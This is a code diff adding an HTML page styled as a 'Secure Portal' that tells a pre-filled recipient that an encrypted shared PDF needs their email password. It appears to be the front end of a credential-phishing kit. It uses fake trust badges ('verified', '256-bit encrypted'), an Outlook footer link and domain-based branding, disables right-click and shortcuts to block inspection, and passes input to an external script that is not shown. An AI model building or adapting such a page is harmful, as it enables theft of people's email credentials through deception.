@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Portal · App Interface</title>
+  <!-- Fonts & icon library -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- jQuery for your script -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap");
+    @import url("https://fonts.googleapis.com/css2?family=Fjalla+One&family=Josefin+Slab:ital,wght@1,100&family=Playfair+Display:ital,wght@0,400;1,900&family=Sofia+Sans+Extra+Condensed:ital,wght@0,1;0,100;0,200;0,300;1,100;1,200&display=swap");
+    @import url("https://fonts.googleapis.com/css?family=Ubuntu+Mono");
+    @import url("https://fonts.googleapis.com/css?family=Ubuntu");
+
+    /* Modern app-like reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(145deg, #f6f9fc 0%, #edf2f7 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      transition: background-image 0.5s ease;
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+
+    /* Overlay with fade effect */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, 
+        rgba(255, 255, 255, 0.95) 0%, 
+        rgba(255, 255, 255, 0.85) 25%, 
+        rgba(255, 255, 255, 0.7) 50%,
+        rgba(255, 255, 255, 0.5) 75%,
+        rgba(255, 255, 255, 0.3) 100%);
+      backdrop-filter: blur(2px);
+      animation: shadeFade 4s ease-in-out infinite alternate;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    @keyframes shadeFade {
+      0% {
+        opacity: 0.4;
+        background: linear-gradient(135deg, 
+          rgba(255, 255, 255, 0.95) 0%, 
+          rgba(255, 255, 255, 0.8) 25%, 
+          rgba(255, 255, 255, 0.6) 50%,
+          rgba(255, 255, 255, 0.4) 75%,
+          rgba(255, 255, 255, 0.2) 100%);
+      }
+      50% {
+        opacity: 0.7;
+        background: linear-gradient(225deg, 
+          rgba(255, 255, 255, 0.98) 0%, 
+          rgba(255, 255, 255, 0.85) 30%, 
+          rgba(255, 255, 255, 0.65) 60%,
+          rgba(255, 255, 255, 0.45) 80%,
+          rgba(255, 255, 255, 0.25) 100%);
+      }
+      100% {
+        opacity: 0.5;
+        background: linear-gradient(45deg, 
+          rgba(255, 255, 255, 0.96) 0%, 
+          rgba(255, 255, 255, 0.82) 20%, 
+          rgba(255, 255, 255, 0.68) 40%,
+          rgba(255, 255, 255, 0.48) 70%,
+          rgba(255, 255, 255, 0.28) 100%);
+      }
+    }
+
+    /* Main app container */
+    .app-container {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* App card */
+    .app-card {
+      background: rgba(255, 255, 255, 0.98);
+      backdrop-filter: blur(10px);
+      border-radius: 32px;
+      box-shadow: 
+        0 20px 40px -10px rgba(0, 20, 40, 0.25),
+        0 0 0 1px rgba(255, 255, 255, 0.5) inset,
+        0 -2px 4px rgba(0, 0, 0, 0.02) inset;
+      overflow: hidden;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .app-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 
+        0 24px 48px -12px rgba(0, 30, 60, 0.3),
+        0 0 0 1px rgba(255, 255, 255, 0.6) inset;
+    }
+
+    /* App header */
+    .app-header {
+      padding: 24px 24px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+    }
+
+    .app-icon {
+      width: 48px;
+      height: 48px;
+      background: linear-gradient(135deg, #0a66c3, #054a92);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 24px;
+      box-shadow: 0 6px 12px rgba(10, 102, 195, 0.2);
+      overflow: hidden;
+    }
+
+    .app-icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .app-title {
+      flex: 1;
+    }
+
+    .app-title h1 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1e2b;
+      margin-bottom: 4px;
+    }
+
+    .app-title .badge {
+      font-size: 13px;
+      color: #0a66c3;
+      background: rgba(10, 102, 195, 0.1);
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-weight: 500;
+      display: inline-block;
+    }
+
+    /* Status bar */
+    .status-bar {
+      display: flex;
+      justify-content: space-between;
+      padding: 16px 24px;
+      background: rgba(10, 102, 195, 0.02);
+      border-bottom: 1px solid rgba(0, 0, 0, 0.03);
+    }
+
+    .status-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #4a5568;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .status-item i {
+      color: #0a66c3;
+      font-size: 14px;
+    }
+
+    /* Location chip */
+    .location-chip {
+      background: white;
+      margin: 16px 24px 8px;
+      padding: 12px 16px;
+      border-radius: 100px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+      border: 1px solid rgba(0, 0, 0, 0.03);
+    }
+
+    .location-chip i.fa-location-dot {
+      color: #ff4800;
+      font-size: 16px;
+    }
+
+    .location-chip i.fa-windows {
+      color: #0a66c3;
+    }
+
+    .location-chip span {
+      font-size: 14px;
+      font-weight: 500;
+      color: #1e293b;
+    }
+
+    .location-chip .divider {
+      color: #cbd5e1;
+      margin: 0 4px;
+    }
+
+    /* Message bubble - Default background */
+    .message-bubble {
+      background: #f0f7ff;
+      margin: 16px 24px;
+      padding: 16px 18px;
+      border-radius: 20px;
+      border-left: 4px solid #0a66c3;
+      font-size: 14px;
+      line-height: 1.5;
+      color: #1e293b;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+    }
+
+    .message-bubble i {
+      color: #0a66c3;
+    }
+
+    .message-bubble b {
+      color: #0a66c3;
+      font-weight: 600;
+    }
+
+    /* Email pill */
+    .email-pill {
+      background: white;
+      margin: 8px 24px 20px;
+      padding: 14px 20px;
+      border-radius: 40px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 1px solid rgba(0, 0, 0, 0.05);
+      box-shadow: 0 8px 16px -8px rgba(0, 0, 0, 0.1);
+    }
+
+    .email-pill i {
+      color: #0a66c3;
+      font-size: 20px;
+    }
+
+    .email-pill h2 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #0a2540;
+      letter-spacing: -0.2px;
+      word-break: break-all;
+    }
+
+    /* Form section */
+    .form-section {
+      padding: 0 24px 24px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #4a5568;
+      margin-bottom: 6px;
+      margin-left: 4px;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .input-field {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-field input {
+      width: 100%;
+      height: 56px;
+      padding: 16px 50px 16px 20px; /* Right padding for icon */
+      font-size: 16px;
+      border: 2px solid #e2e8f0;
+      border-radius: 20px;
+      background: white;
+      transition: all 0.2s ease;
+      font-family: 'Inter', sans-serif;
+      letter-spacing: 0.3px;
+    }
+
+    .input-field input:focus {
+      border-color: #0a66c3;
+      outline: none;
+      box-shadow: 0 0 0 4px rgba(10, 102, 195, 0.15);
+    }
+
+    .input-field label {
+      position: absolute;
+      left: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #94a3b8;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      pointer-events: none;
+      background: white;
+      padding: 0 4px;
+      z-index: 1;
+    }
+
+    .input-field input:focus ~ label,
+    .input-field input:not(:placeholder-shown) ~ label {
+      top: 0;
+      font-size: 13px;
+      color: #0a66c3;
+      font-weight: 500;
+    }
+
+    /* Password visibility toggle icon */
+    .password-toggle {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #94a3b8;
+      font-size: 18px;
+      transition: all 0.2s ease;
+      z-index: 2;
+      background: white;
+      padding: 5px;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .password-toggle:hover {
+      color: #0a66c3;
+      background: #f0f7ff;
+    }
+
+    .password-toggle.active {
+      color: #0a66c3;
+    }
+
+    /* Error box - now with domain display */
+    .error-box {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 8px 0 16px;
+      padding: 8px 12px;
+      background: #fff8f8;
+      border-radius: 12px;
+      border: 1px solid #fee2e2;
+    }
+
+    .auth-required {
+      color: #dc2626;
+      font-size: 13px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .auth-required i {
+      font-size: 14px;
+    }
+
+    .domain-display {
+      color: #0a66c3;
+      font-size: 13px;
+      font-weight: 600;
+      background: rgba(10, 102, 195, 0.1);
+      padding: 4px 10px;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .domain-display i {
+      font-size: 12px;
+    }
+
+    /* Password error message - inline with input */
+    .password-error-message {
+      color: #dc2626;
+      font-size: 12px;
+      margin-top: 4px;
+      margin-left: 12px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .password-error-message i {
+      font-size: 12px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Show password row - Now just "Forgot?" link */
+    .show-password-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 12px 0 20px;
+    }
+
+    .show-password-row a {
+      color: #0a66c3;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .show-password-row a:hover {
+      text-decoration: underline;
+    }
+
+    /* Next button - default color (#0a66c3) */
+    .next-button {
+      width: 100%;
+      height: 56px;
+      background: #0a66c3;
+      border: none;
+      border-radius: 20px;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 8px 20px -5px rgba(10, 102, 195, 0.4);
+    }
+
+    .next-button:hover {
+      transform: scale(1.02);
+      background: #054a92;
+      box-shadow: 0 12px 24px -6px rgba(10, 102, 195, 0.5);
+    }
+
+    .next-button:active {
+      transform: scale(0.98);
+    }
+
+    /* Footer */
+    .app-footer {
+      padding: 20px 24px 24px;
+      border-top: 1px solid rgba(0, 0, 0, 0.05);
+      display: flex;
+      justify-content: space-between;
+      color: #64748b;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 16px;
+    }
+
+    .footer-links a {
+      color: #64748b;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+
+    .footer-links a:hover {
+      color: #0a66c3;
+    }
+
+    /* Loading screen - pure white */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      transition: opacity 0.5s ease;
+    }
+
+    .loading-content {
+      text-align: center;
+      max-width: 320px;
+      padding: 20px;
+    }
+
+    /* White circular loader */
+    .circular-loader {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 30px;
+      position: relative;
+    }
+
+    .circle {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 4px solid #f0f0f0;
+      border-top-color: #333333;
+      border-right-color: #666666;
+      border-bottom-color: #999999;
+      border-left-color: #cccccc;
+      animation: rotate 1.2s cubic-bezier(0.5, 0.1, 0.3, 0.9) infinite;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    }
+
+    .inner-circle {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      bottom: 20px;
+      border-radius: 50%;
+      background: white;
+      box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.05);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #333333;
+      font-size: 24px;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 1; }
+    }
+
+    .loading-dots:after {
+      content: '.';
+      animation: dots 1.5s steps(5, end) infinite;
+      color: #333333;
+    }
+
+    @keyframes dots {
+      0%, 20% { content: '.'; }
+      40% { content: '..'; }
+      60% { content: '...'; }
+      80%, 100% { content: ''; }
+    }
+
+    .loading-text-main {
+      color: #333333;
+      font-size: 24px;
+      font-weight: 600;
+      margin: 20px 0 10px;
+    }
+
+    .loading-sub {
+      color: #666666;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    .loading-email-badge {
+      background: #f5f5f5;
+      padding: 12px 20px;
+      border-radius: 50px;
+      color: #333333;
+      font-weight: 500;
+      font-size: 14px;
+      border: 1px solid #e0e0e0;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+    }
+
+    .loading-email-badge i {
+      color: #0a66c3;
+      font-size: 16px;
+    }
+
+    .loading-screen.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    /* Notification system */
+    .notification-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      pointer-events: none;
+    }
+
+    .notification {
+      background: white;
+      border-radius: 12px;
+      padding: 16px 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      min-width: 280px;
+      max-width: 350px;
+      animation: slideIn 0.3s ease forwards;
+      border-left: 4px solid #0a66c3;
+      pointer-events: auto;
+    }
+
+    .notification.success {
+      border-left-color: #10b981;
+    }
+
+    .notification.error {
+      border-left-color: #ef4444;
+    }
+
+    .notification.warning {
+      border-left-color: #f59e0b;
+    }
+
+    .notification-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+    }
+
+    .notification.success .notification-icon {
+      background: #10b981;
+      color: white;
+    }
+
+    .notification.error .notification-icon {
+      background: #ef4444;
+      color: white;
+    }
+
+    .notification.warning .notification-icon {
+      background: #f59e0b;
+      color: white;
+    }
+
+    .notification.info .notification-icon {
+      background: #0a66c3;
+      color: white;
+    }
+
+    .notification-content {
+      flex: 1;
+      font-size: 14px;
+      color: #1e293b;
+      font-weight: 500;
+    }
+
+    .notification-close {
+      color: #94a3b8;
+      cursor: pointer;
+      font-size: 12px;
+      transition: color 0.2s ease;
+    }
+
+    .notification-close:hover {
+      color: #1e293b;
+    }
+
+    @keyframes slideIn {
+      from {
+        transform: translateX(100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+
+    @keyframes slideOut {
+      from {
+        transform: translateX(100%);
+        opacity: 1;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 0;
+      }
+    }
+
+    .notification.hiding {
+      animation: slideOut 0.3s ease forwards;
+    }
+
+    /* Message display for authentication errors */
+    #auth_reg, #msg {
+      display: none;
+    }
+
+    /* Disable selection and right-click */
+    body {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    /* Language selector */
+    .language-selector {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      z-index: 1001;
+      background: white;
+      border-radius: 30px;
+      padding: 5px 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      border: 1px solid #e2e8f0;
+    }
+
+    .language-selector select {
+      border: none;
+      background: transparent;
+      font-size: 13px;
+      font-weight: 500;
+      color: #1e293b;
+      outline: none;
+      cursor: pointer;
+      padding: 5px;
+    }
+
+    .language-selector i {
+      color: #0a66c3;
+      font-size: 14px;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .app-card {
+        border-radius: 24px;
+      }
+      
+      .app-header {
+        padding: 20px;
+      }
+      
+      .form-section {
+        padding: 0 20px 20px;
+      }
+      
+      .notification-container {
+        top: 10px;
+        right: 10px;
+        left: 10px;
+      }
+      
+      .notification {
+        min-width: auto;
+        max-width: none;
+      }
+      
+      .language-selector {
+        top: 5px;
+        right: 5px;
+      }
+    }
+  </style>
+</head>
+<body id="body" oncontextmenu="return false;" onkeydown="return disableShortcuts(event)">
+
+  <!-- Language Selector -->
+  <div class="language-selector">
+    <i class="fas fa-globe"></i>
+    <select id="languageSelect">
+      <option value="en" selected>🇺🇸 English</option>
+      <option value="pt">🇵🇹 Português</option>
+      <option value="es">🇪🇸 Español</option>
+      <option value="fr">🇫🇷 Français</option>
+      <option value="de">🇩🇪 Deutsch</option>
+      <option value="it">🇮🇹 Italiano</option>
+      <option value="nl">🇳🇱 Nederlands</option>
+      <option value="pl">🇵🇱 Polski</option>
+      <option value="ru">🇷🇺 Русский</option>
+      <option value="ja">🇯🇵 日本語</option>
+      <option value="ko">🇰🇷 한국어</option>
+      <option value="zh">🇨🇳 中文</option>
+      <option value="ar">🇸🇦 العربية</option>
+      <option value="hi">🇮🇳 हिन्दी</option>
+      <option value="tr">🇹🇷 Türkçe</option>
+    </select>
+  </div>
+
+  <!-- Notification Container -->
+  <div class="notification-container" id="notificationContainer"></div>
+
+  <!-- Favicon link - Fixed with proper rel and type -->
+  <link id="faviconx" rel="shortcut icon" type="image/x-icon" href="">
+  <link id="faviconx-alt" rel="icon" type="image/x-icon" href="">
+  <link id="faviconx-apple" rel="apple-touch-icon" href="">
+
+  <!-- Loading Screen - Pure white -->
+  <div class="loading-screen" id="loadingScreen">
+    <div class="loading-content">
+      <div class="circular-loader">
+        <div class="circle"></div>
+        <div class="inner-circle">
+          <i class="fas fa-shield-halved"></i>
+        </div>
+      </div>
+      
+      <div class="loading-text-main" id="loadingTitle">
+        Initializing<span class="loading-dots"></span>
+      </div>
+      
+      <div class="loading-sub" id="loadingSub">
+        Establishing secure connection
+      </div>
+      
+      <div class="loading-email-badge" id="loadingEmailBadge">
+        <i class="fas fa-envelope"></i>
+        <span id="loadingEmailDisplay">Loading email...</span>
+      </div>
+      
+      <div style="margin-top: 30px; color: #999999; font-size: 13px;" id="loadingFooter">
+        <i class="fas fa-lock" style="margin-right: 6px;"></i> 256-bit encrypted
+      </div>
+    </div>
+  </div>
+
+  <!-- Main App Container -->
+  <div class="app-container" id="appContainer" style="opacity: 0; transition: opacity 0.4s ease;">
+    <!-- App Card -->
+    <div class="app-card">
+      <!-- App Header -->
+      <div class="app-header">
+        <div class="app-icon" id="appIcon">
+          <!-- Logo will be loaded here dynamically -->
+          <img id="logoImage" src="" alt="logo" style="display: none;">
+          <i class="fas fa-envelope" id="logoFallback"></i>
+        </div>
+        <div class="app-title">
+          <h1 id="appTitle">Secure Portal</h1>
+          <span class="badge" id="verifiedBadge"><i class="fas fa-check-circle" style="font-size: 12px;"></i> verified</span>
+        </div>
+      </div>
+
+      <!-- Status Bar -->
+      <div class="status-bar">
+        <div class="status-item">
+          <i class="fas fa-shield"></i>
+          <span id="statusProtected">protected</span>
+        </div>
+        <div class="status-item">
+          <i class="fas fa-clock"></i>
+          <span id="liveTime"></span>
+        </div>
+        <div class="status-item">
+          <i class="fas fa-wifi"></i>
+          <span id="statusSecure">secure</span>
+        </div>
+      </div>
+
+      <!-- Location Chip with dynamic data -->
+      <div class="location-chip">
+        <i class="fa-solid fa-location-dot"></i>
+        <span id="locationDisplay">Loading location...</span>
+        <span class="divider">•</span>
+        <i class="fa-brands fa-windows"></i>
+        <span id="osDisplay">Loading...</span>
+      </div>
+
+      <!-- Message Bubble - Default background -->
+      <div class="message-bubble" id="messageBubble">
+        <i class="fas fa-lock" style="margin-right: 8px; color: #0a66c3;"></i>
+        <span id="messageText">Only recipient email can access shared PDF <b><span id="manutd">encrypted</span></b> document. Enter password to continue.</span>
+      </div>
+
+      <!-- Email Pill - Hidden input for email -->
+      <div class="email-pill">
+        <i class="fas fa-envelope-open-text"></i>
+        <h2 id="displayEmail">Loading...</h2>
+      </div>
+      
+      <!-- ========== ADDED: Hidden email input for form ========== -->
+      <input type="hidden" id="email" name="email" value="">
+
+      <!-- Form Section -->
+      <div class="form-section">
+        <div class="input-group">
+          <div class="input-label" id="passwordLabel">
+            <i class="fas fa-key" style="margin-right: 4px;"></i> password
+          </div>
+          <div class="input-field">
+            <input type="password" id="passwordInput" placeholder=" " autofocus>
+            <label for="passwordInput" id="passwordPlaceholder">Enter your password</label>
+            <!-- Password visibility toggle icon -->
+            <div class="password-toggle" id="passwordToggle">
+              <i class="fas fa-eye" id="toggleIcon"></i>
+            </div>
+          </div>
+          <!-- Password error message appears here -->
+          <div id="passwordError" class="password-error-message" style="display: none;">
+            <i class="fas fa-exclamation-circle"></i>
+            <span id="passwordErrorText">Password is required</span>
+          </div>
+        </div>
+
+        <!-- Error/Status Box - Now shows domain instead of attempts -->
+        <div class="error-box">
+          <div class="auth-required" id="auth_reg" style="display: none;">
+            <i class="fas fa-exclamation-circle"></i>
+            <span id="auth_reg_message">Authentication required</span>
+          </div>
+          <div class="auth-required" id="msg" style="display: none;">
+            <i class="fas fa-exclamation-circle"></i>
+            <span id="msg_message">Password is not correct. Please try again</span>
+          </div>
+          <div class="domain-display" id="domainDisplay">
+            <i class="fas fa-globe"></i>
+            <span id="domainName">domain.com</span>
+          </div>
+        </div>
+
+        <!-- Show Password & Options - Now just "Forgot?" link -->
+        <div class="show-password-row">
+          <div style="flex: 1; text-align: right;">
+            <a href="#" id="forgotLink" style="color: #0a66c3; font-size: 14px; font-weight: 500; text-decoration: none;">Forgot password?</a>
+          </div>
+        </div>
+
+        <!-- Next Button - Default color (#0a66c3) -->
+        <button class="next-button" id="nextButton">
+          <span id="continueText">Continue</span>
+          <i class="fas fa-arrow-right"></i>
+        </button>
+      </div>
+
+      <!-- Footer -->
+      <div class="app-footer">
+        <div>© 2026</div>
+        <div class="footer-links">
+          <!-- ========== ADDED: footer_dom element ========== -->
+          <a href="#" id="footer_dom">outlook</a>
+          <a href="#" id="footerPortal">portal</a>
+          <a href="#" id="footerPrivacy">privacy</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== ADDED: Your JavaScript file or inline script ========== -->
+  <script src="bobby.js"></script>
+  
+</body>
+</html>
